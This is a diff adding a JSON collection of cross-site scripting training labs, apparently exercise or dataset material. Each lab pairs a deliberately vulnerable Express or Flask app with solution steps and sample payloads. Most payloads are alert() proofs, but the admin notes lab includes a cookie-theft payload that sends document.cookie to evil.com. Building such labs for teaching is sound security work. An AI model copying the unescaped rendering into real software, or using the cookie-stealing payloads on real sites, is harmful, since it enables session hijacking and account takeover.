@@ -1,0 +1,422 @@
+[
+    {
+      "Lab scenario": "Stored XSS in User-Generated Calendar Event Titles",
+      "Lab Description": "The web calendar allows users to add events with custom titles and descriptions. Titles are rendered on the main calendar interface without sanitization, enabling persistent XSS.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Submit a new calendar event with a title that includes an XSS payload.",
+        "Visit the calendar homepage where the event titles are listed.",
+        "The script executes when the calendar renders the malicious event."
+      ],
+      "payloads": [
+        "<script>alert('calendar')</script>",
+        "<img src=x onerror=alert('calendar')>"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet events = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/calendar', (req, res) => {\n  const eventList = events.map(e => `<li>${e.title}</li>`).join('');\n  res.send(`<html><body><ul>${eventList}</ul><form action='/addevent' method='POST'><input name='title'><button>Add</button></form></body></html>`);\n});\n\napp.post('/addevent', (req, res) => {\n  events.push({ title: req.body.title });\n  res.redirect('/calendar');\n});\n\napp.listen(3000);"
+    },
+    {
+      "Lab scenario": "Reflected XSS in Feedback Search Query",
+      "Lab Description": "The feedback search feature reflects the user query directly into the results page title without proper escaping, allowing reflected XSS through the query string.",
+      "Difficulty Level": "Easy",
+      "Solution Steps": [
+        "Send a search request with a script in the query parameter.",
+        "Observe the reflected payload executing in the page response."
+      ],
+      "payloads": [
+        "<script>alert('feedback')</script>",
+        "<svg/onload=alert('feedback')>"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/feedback', (req, res) => {\n  const q = req.query.q || '';\n  res.send(`<html><body><h3>Results for: ${q}</h3></body></html>`);\n});\n\napp.listen(3000);"
+    },
+    {
+      "Lab scenario": "Stored XSS in User-Supplied Video Titles",
+      "Lab Description": "The video sharing platform allows users to upload videos and provide a title. These titles are rendered in the homepage feed without escaping, enabling persistent XSS.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Submit a new video with a malicious title containing script tags.",
+        "Open the homepage feed to trigger script execution."
+      ],
+      "payloads": [
+        "<script>alert('video')</script>",
+        "<img src=x onerror=alert('video')>"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet videos = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/home', (req, res) => {\n  const list = videos.map(v => `<li>${v.title}</li>`).join('');\n  res.send(`<html><body><ul>${list}</ul><form action='/upload' method='POST'><input name='title'><button>Upload</button></form></body></html>`);\n});\n\napp.post('/upload', (req, res) => {\n  videos.push({ title: req.body.title });\n  res.redirect('/home');\n});\n\napp.listen(3000);"
+    },
+    {
+      "Lab scenario": "DOM XSS via URL Fragment Injection in Dynamic Viewer",
+      "Lab Description": "A dynamic viewer loads content based on the `window.location.hash` and directly injects it into the DOM. This leads to a DOM-based XSS vulnerability via the URL fragment.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Craft a URL with a malicious script in the fragment portion.",
+        "Load the page to trigger DOM XSS."
+      ],
+      "payloads": [
+        "#<img src=x onerror=alert('dom')>",
+        "#<svg/onload=alert('dom')>"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html><body>\n      <div id='viewer'></div>\n      <script>\n        const frag = location.hash.slice(1);\n        document.getElementById('viewer').innerHTML = frag;\n      </script>\n    </body></html>\n  `);\n});\n\napp.listen(3000);"
+    },
+    {
+      "Lab scenario": "Stored XSS in Poll Option Text",
+      "Lab Description": "Users can create polls and define custom options. Option text is rendered into a voting form without escaping, making the app vulnerable to stored XSS.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Create a poll with a malicious option payload.",
+        "Load the poll voting page and trigger script execution."
+      ],
+      "payloads": [
+        "<script>alert('poll')</script>",
+        "<img src=x onerror=alert('poll')>"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet poll = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/poll', (req, res) => {\n  const opts = poll.map(o => `<label><input type='radio' name='vote'>${o}</label><br>`).join('');\n  res.send(`<html><body>${opts}<form action='/add-option' method='POST'><input name='opt'><button>Add Option</button></form></body></html>`);\n});\n\napp.post('/add-option', (req, res) => {\n  poll.push(req.body.opt);\n  res.redirect('/poll');\n});\n\napp.listen(3000);"
+    },
+    {
+        "Lab scenario": "XSS in Ticket Support System - Message Preview",
+        "Lab Description": "A customer support portal displays a preview of a message before submitting a ticket. The message content is rendered in real-time on the preview panel without sanitization.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Go to the support ticket form.",
+          "Enter an XSS payload in the 'message' field.",
+          "Observe that the preview panel immediately reflects the payload.",
+          "Use a payload that triggers JavaScript execution in the preview area."
+        ],
+        "payloads": [
+          "<script>alert(1)</script>",
+          "<img src=x onerror=alert(1)>",
+          "<svg onload=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/support', methods=['GET'])\ndef support_form():\n    return '''\n    <html>\n        <body>\n            <form action='/submit' method='POST'>\n                <textarea name='message' oninput=\"document.getElementById('preview').innerHTML = this.value\"></textarea>\n                <div id='preview'></div>\n                <button type='submit'>Send</button>\n            </form>\n        </body>\n    </html>\n    '''\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    return 'Ticket submitted'\n\napp.run(port=5006)"
+      },
+      {
+        "Lab scenario": "Reflected XSS in Search Page with Dynamic Breadcrumb",
+        "Lab Description": "The search feature updates the page breadcrumb dynamically based on the search query. The search term is reflected into an innerHTML context without sanitization.",
+        "Difficulty Level": "Easy",
+        "Solution Steps": [
+          "Search for any keyword using the search bar.",
+          "Inspect how the breadcrumb reflects the search term.",
+          "Inject a payload as part of the search term.",
+          "Confirm JavaScript execution."
+        ],
+        "payloads": [
+          "\"><img src=x onerror=alert(1)>",
+          "<script>alert(document.domain)</script>",
+          "<svg/onload=alert('XSS')>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    term = request.args.get('q', '')\n    return f'''\n    <html>\n        <body>\n            <div id='breadcrumb'>Search &gt; <span id='search-term'>{term}</span></div>\n            <p>Showing results for: {term}</p>\n        </body>\n    </html>\n    '''\n\napp.run(port=5007)"
+    },
+    {
+        "Lab scenario": "DOM XSS via Client-side Parsed JSON Data",
+        "Lab Description": "A blog site loads post content from a JSON file and injects it into the DOM using `innerHTML`. Malicious script in the JSON data can lead to DOM-based XSS.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+          "Modify the JSON endpoint or intercept it via Burp.",
+          "Insert a malicious script inside the blog content.",
+          "Observe script execution after DOM injection.",
+          "Use payloads inside the blog content object."
+        ],
+        "payloads": [
+          "<script>alert('DOM XSS')</script>",
+          "<img src=x onerror=alert(1)>",
+          "<svg onload=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, jsonify, request\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''\n    <html>\n        <body>\n            <div id='blog'></div>\n            <script>\n                fetch('/data').then(res => res.json()).then(data => {\n                    document.getElementById('blog').innerHTML = data.content;\n                });\n            </script>\n        </body>\n    </html>\n    '''\n\n@app.route('/data')\ndef data():\n    return jsonify({\"content\": \"<h1>Welcome</h1>\"})\n\napp.run(port=5008)"
+    },
+    {
+        "Lab scenario": "XSS in User Comments with Template Literals",
+        "Lab Description": "A forum app renders user comments using JavaScript template literals without escaping content, allowing injection of script tags.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Submit a comment with an XSS payload.",
+          "Observe the comment list where content is rendered with backtick-based templates.",
+          "Payload will execute as part of the rendered comment."
+        ],
+        "payloads": [
+          "<img src=x onerror=alert('comment')>",
+          "<script>alert('comment xss')</script>",
+          "<svg/onload=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request\napp = Flask(__name__)\ncomments = []\n\n@app.route('/', methods=['GET', 'POST'])\ndef home():\n    if request.method == 'POST':\n        comments.append(request.form['comment'])\n    comment_html = ''.join([f\"<li>{c}</li>\" for c in comments])\n    return f'''\n    <html>\n        <body>\n            <form method='POST'>\n                <input name='comment'>\n                <button>Post</button>\n            </form>\n            <ul id='list'></ul>\n            <script>\n                const comments = `{comment_html}`;\n                document.getElementById('list').innerHTML = comments;\n            </script>\n        </body>\n    </html>\n    '''\n\napp.run(port=5009)"
+    },
+    {
+        "Lab scenario": "Stored XSS in Markdown Blog Renderer",
+        "Lab Description": "A blogging platform allows users to post content using Markdown. The Markdown is rendered client-side, but HTML tags inside the Markdown are not sanitized.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+          "Create a new blog post using Markdown syntax.",
+          "Include raw HTML/script inside the Markdown content.",
+          "The renderer converts and displays it directly into the DOM.",
+          "Use script tags to confirm code execution."
+        ],
+        "payloads": [
+          "<script>alert('markdown')</script>",
+          "<img src=x onerror=alert('markdown xss')>",
+          "<svg onload=alert('xss')>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\nposts = []\n\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'POST':\n        posts.append(request.form['content'])\n    rendered = '<br>'.join(posts)\n    return f'''\n    <html>\n        <body>\n            <form method='POST'>\n                <textarea name='content'></textarea>\n                <button>Post</button>\n            </form>\n            <div id='posts'>{rendered}</div>\n        </body>\n    </html>\n    '''\n\napp.run(port=5010)"
+    },
+    {
+        "Lab scenario": "Reflected XSS in Email Verification Error Message",
+        "Lab Description": "An email verification system reflects the email address directly into an error message when a malformed email is entered. The input is rendered unsanitized into an HTML element.",
+        "Difficulty Level": "Easy",
+        "Solution Steps": [
+          "Submit a malformed email containing a payload.",
+          "Observe the reflected error message on the page.",
+          "If executed, the payload triggers JavaScript."
+        ],
+        "payloads": [
+          "<script>alert('email')</script>",
+          "<img src=x onerror=alert(1)>",
+          "<svg/onload=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/verify')\ndef verify():\n    email = request.args.get('email', '')\n    if '@' not in email:\n        return f\"\"\"\n        <html>\n            <body>\n                <p>Email verification failed: {email}</p>\n            </body>\n        </html>\n        \"\"\"\n    return 'Verified'\n\napp.run(port=5011)"
+      },
+      {
+        "Lab scenario": "Stored XSS in Product Reviews Section",
+        "Lab Description": "A shopping site allows users to leave reviews on products. Reviews are displayed on the product page without sanitizing HTML tags.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Submit a product review containing a script payload.",
+          "Visit the product page afterward.",
+          "The review is rendered as HTML, executing the payload."
+        ],
+        "payloads": [
+          "<script>alert('review')</script>",
+          "<img src=x onerror=alert('stored xss')>",
+          "<svg/onload=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\nreviews = []\n\n@app.route('/', methods=['GET', 'POST'])\ndef product():\n    if request.method == 'POST':\n        reviews.append(request.form['review'])\n    review_html = '<br>'.join(reviews)\n    return f'''\n    <html>\n        <body>\n            <h2>Product A</h2>\n            <form method='POST'>\n                <textarea name='review'></textarea>\n                <button>Submit</button>\n            </form>\n            <div>{review_html}</div>\n        </body>\n    </html>\n    '''\n\napp.run(port=5012)"
+    },
+    {
+        "Lab scenario": "DOM XSS via URL Fragment Injection",
+        "Lab Description": "A single-page app reads the URL hash fragment and displays it in the interface without validation. This allows an attacker to inject JavaScript that executes in the DOM context.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Modify the URL fragment after the hash (#).",
+          "Inject a script payload into the fragment.",
+          "The JavaScript reads the fragment and injects it into innerHTML."
+        ],
+        "payloads": [
+          "#<img src=x onerror=alert('dom xss')>",
+          "#<script>alert('xss')</script>",
+          "#<svg/onload=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''\n    <html>\n        <body>\n            <div id='frag'></div>\n            <script>\n                const hash = window.location.hash.substring(1);\n                document.getElementById('frag').innerHTML = hash;\n            </script>\n        </body>\n    </html>\n    '''\n\napp.run(port=5013)"
+      },
+      {
+        "Lab scenario": "XSS in Admin-only Notes Panel (Privilege Escalation Risk)",
+        "Lab Description": "Admin panel loads user notes stored in a database and renders them into a dashboard using innerHTML. Users can insert stored notes which, if viewed by admin, execute XSS.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+          "Submit a crafted note entry.",
+          "Wait for an admin to view the notes page.",
+          "Payload executes in the admin browser session."
+        ],
+        "payloads": [
+          "<script>fetch('/admin/cookie',{method:'POST',body:document.cookie})</script>",
+          "<img src=x onerror=document.location='http://evil.com/?'+document.cookie>",
+          "<svg/onload=alert('admin')>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\nnotes = []\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    notes.append(request.form['note'])\n    return 'Note submitted'\n\n@app.route('/admin')\ndef admin():\n    rendered = ''.join([f\"<div>{n}</div>\" for n in notes])\n    return f\"\"\"\n    <html>\n        <body>\n            <h2>Admin Notes Panel</h2>\n            {rendered}\n        </body>\n    </html>\n    \"\"\"\n\napp.run(port=5014)"
+    },
+    {
+        "Lab scenario": "XSS in Image Upload Preview using FileReader",
+        "Lab Description": "The application previews uploaded image filenames using FileReader and injects the name into the DOM without sanitization, allowing for payloads in fake image names.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Create a fake image with a malicious filename like \"><script>alert(1)</script>.",
+          "Upload it using the form.",
+          "Observe XSS execution when the preview is rendered."
+        ],
+        "payloads": [
+          "\"><svg/onload=alert(1)>",
+          "\"><script>alert(1)</script>",
+          "\"><img src=x onerror=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask\napp = Flask(__name__)\n\n@app.route('/')\ndef upload():\n    return '''\n    <html>\n        <body>\n            <input type='file' onchange='handleFile(this.files[0])'>\n            <div id='preview'></div>\n            <script>\n                function handleFile(file) {\n                    document.getElementById('preview').innerHTML = file.name;\n                }\n            </script>\n        </body>\n    </html>\n    '''\n\napp.run(port=5015)"
+    },
+    
+    {
+        "Lab scenario": "XSS via Profile Avatar Upload Preview",
+        "Lab Description": "The web application allows users to upload profile pictures. It provides an immediate preview by rendering the uploaded image file name into an `img` tag using client-side JavaScript. However, no sanitization is applied to the file name, leading to potential script injection.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Navigate to the profile picture upload section.",
+        "Use the file picker or intercept the request and change the filename to include an XSS payload.",
+        "Observe the preview functionality rendering the malicious payload in the `img` tag."
+        ],
+        "payloads": [
+        "\"><img src=x onerror=alert(1)>",
+        "\"><svg onload=alert(1)>",
+        "<script>alert(1)</script>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/', methods=['GET', 'POST'])\ndef upload():\n    if request.method == 'POST':\n        filename = request.form.get('filename')\n        return render_template_string(f\"\"\"\n            <html>\n                <body>\n                    <h3>Upload Preview</h3>\n                    <img src='/uploads/{filename}'>\n                    <form method='POST'>\n                        <input name='filename'>\n                        <button type='submit'>Upload</button>\n                    </form>\n                </body>\n            </html>\n        \"\"\")\n    return '''<form method='POST'><input name='filename'><button type='submit'>Upload</button></form>'''\n\napp.run()"
+    },
+    {
+        "Lab scenario": "XSS in Search Auto-Completion Suggestions",
+        "Lab Description": "The application returns dynamic auto-suggestions for search input. The response is built using unsanitized input directly rendered into a dropdown list without escaping, allowing XSS.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Go to the search bar and type an XSS payload.",
+        "Observe the auto-suggestions rendering the input directly inside HTML.",
+        "Trigger JavaScript execution through injected payload."
+        ],
+        "payloads": [
+        "<img src=x onerror=alert('XSS')>",
+        "<svg/onload=alert(1)>",
+        "<script>alert('AutoXSS')</script>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    q = request.args.get('q', '')\n    return f\"<ul><li>{q}</li><li>{q} books</li></ul>\"\n\napp.run()"
+    },
+    {
+        "Lab scenario": "Reflected XSS in Contact Us Confirmation",
+        "Lab Description": "The application reflects submitted data in a confirmation page after the user fills out the contact form. The input is echoed back without encoding, leading to reflected XSS.",
+        "Difficulty Level": "Easy",
+        "Solution Steps": [
+        "Submit the contact form with a payload in the 'name' field.",
+        "Observe the output rendered in the confirmation page.",
+        "Check for JavaScript execution."
+        ],
+        "payloads": [
+        "<script>alert('XSS')</script>",
+        "\"><img src=x onerror=alert(1)>",
+        "<svg/onload=alert('XSS')>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/', methods=['GET', 'POST'])\ndef contact():\n    if request.method == 'POST':\n        name = request.form.get('name')\n        return f\"<h3>Thanks for contacting us, {name}!</h3>\"\n    return '''<form method='POST'><input name='name'><button type='submit'>Submit</button></form>'''\n\napp.run()"
+    },
+    {
+        "Lab scenario": "XSS in E-Commerce Coupon Feedback",
+        "Lab Description": "An e-commerce site allows users to submit coupon feedback. The feedback is stored and displayed on a page using innerHTML without sanitization, introducing a DOM-based XSS.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Submit feedback with an XSS payload via the coupon section.",
+        "Visit the feedback page and observe the stored comment rendered unsafely.",
+        "Observe the DOM-based execution of your payload."
+        ],
+        "payloads": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg/onload=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request, redirect\n\napp = Flask(__name__)\nfeedbacks = []\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    msg = request.form.get('msg')\n    feedbacks.append(msg)\n    return redirect('/feedback')\n\n@app.route('/feedback')\ndef feedback():\n    out = ''.join(f\"<div>{f}</div>\" for f in feedbacks)\n    return f\"<html><body>{out}</body></html>\"\n\n@app.route('/')\ndef form():\n    return '''<form action='/submit' method='POST'><input name='msg'><button type='submit'>Send</button></form>'''\n\napp.run()"
+    },
+    {
+        "Lab scenario": "XSS in Newsletter Subscription Confirmation Page",
+        "Lab Description": "After signing up for a newsletter, the application reflects the submitted email on a confirmation page using innerHTML. No sanitization is applied.",
+        "Difficulty Level": "Easy",
+        "Solution Steps": [
+        "Enter a payload as the email value and submit the form.",
+        "Observe the reflected value in the confirmation page triggering script execution."
+        ],
+        "payloads": [
+        "\"><script>alert('XSS')</script>",
+        "\"><img src=x onerror=alert(1)>",
+        "<svg/onload=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request, redirect\n\napp = Flask(__name__)\n\n@app.route('/subscribe', methods=['POST'])\ndef subscribe():\n    email = request.form.get('email')\n    return f\"<h3>Subscribed successfully with {email}</h3>\"\n\n@app.route('/')\ndef form():\n    return '''<form action='/subscribe' method='POST'><input name='email'><button type='submit'>Subscribe</button></form>'''\n\napp.run()"
+    },
+    
+    {
+        "Lab scenario": "XSS via Redirect Message in OAuth Flow",
+        "Lab Description": "An application uses a message passed in the redirect URL during OAuth flow to display feedback. The message is inserted into the DOM without sanitization, leading to DOM-based XSS.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Craft a redirect URL with a malicious `message` parameter.",
+        "Complete the login flow and observe the message displayed unsafely.",
+        "Trigger the XSS."
+        ],
+        "payloads": [
+        "<script>alert('OAuth XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg/onload=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/callback')\ndef callback():\n    msg = request.args.get('message', '')\n    return f\"<div>{msg}</div>\"\n\napp.run()"
+    },
+    {
+        "Lab scenario": "XSS in Image Gallery Caption",
+        "Lab Description": "Users can submit images with custom captions. The captions are rendered under the image using innerHTML without sanitization, making it vulnerable to XSS.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Submit an image with an XSS payload as a caption.",
+        "View the gallery and confirm script execution."
+        ],
+        "payloads": [
+        "<img src=x onerror=alert('XSS')>",
+        "<script>alert('Gallery')</script>",
+        "<svg/onload=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request, redirect\n\napp = Flask(__name__)\ngallery = []\n\n@app.route('/upload', methods=['POST'])\ndef upload():\n    caption = request.form.get('caption')\n    gallery.append(caption)\n    return redirect('/gallery')\n\n@app.route('/gallery')\ndef view():\n    return ''.join(f\"<div>{c}</div>\" for c in gallery)\n\n@app.route('/')\ndef form():\n    return '''<form method='POST' action='/upload'><input name='caption'><button>Submit</button></form>'''\n\napp.run()"
+    },
+    {
+        "Lab scenario": "XSS via Admin Panel Alert Message",
+        "Lab Description": "Admin panel shows alert messages based on URL parameters. This is inserted directly into the page using innerHTML.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Visit `/admin?alert=...` with an XSS payload.",
+        "Confirm execution in the alert box."
+        ],
+        "payloads": [
+        "<script>alert('Admin XSS')</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg/onload=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/admin')\ndef admin():\n    alert = request.args.get('alert', '')\n    return f\"<div class='alert'>{alert}</div>\"\n\napp.run()"
+    },
+    {
+        "Lab scenario": "XSS in Tag-Based Blog Filtering",
+        "Lab Description": "Blog allows filtering posts by tag using a `tag` URL parameter. The tag name is echoed on the page title and body unsanitized.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Visit the tag filter with a payload as the `tag` value.",
+        "Observe the vulnerable reflection in the DOM and page title.",
+        "Trigger script execution."
+        ],
+        "payloads": [
+        "<script>alert('Tag XSS')</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg/onload=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/blog')\ndef blog():\n    tag = request.args.get('tag', '')\n    return f\"<html><head><title>{tag}</title></head><body>Showing posts tagged: {tag}</body></html>\"\n\napp.run()"
+    },
+    {
+        "Lab scenario": "XSS in Live Chat Widget",
+        "Lab Description": "The live chat widget reflects user input messages using innerHTML without sanitization. This leads to real-time DOM-based XSS for other users.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Send a message with XSS payload.",
+        "View the live chat log from another user session.",
+        "Observe XSS trigger."
+            ],
+        "payloads": [
+        "<script>alert('Chat XSS')</script>",
+            "<img src=x onerror=alert(1)>",
+            "<svg/onload=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\nchat_log = []\n\n@app.route('/chat', methods=['GET', 'POST'])\ndef chat():\n    if request.method == 'POST':\n        msg = request.form.get('msg')\n        chat_log.append(msg)\n    messages = ''.join(f\"<div>{m}</div>\" for m in chat_log)\n    return f'''<form method='POST'><input name='msg'><button>Send</button></form>{messages}'''\n\napp.run()"
+    }
+]
+  
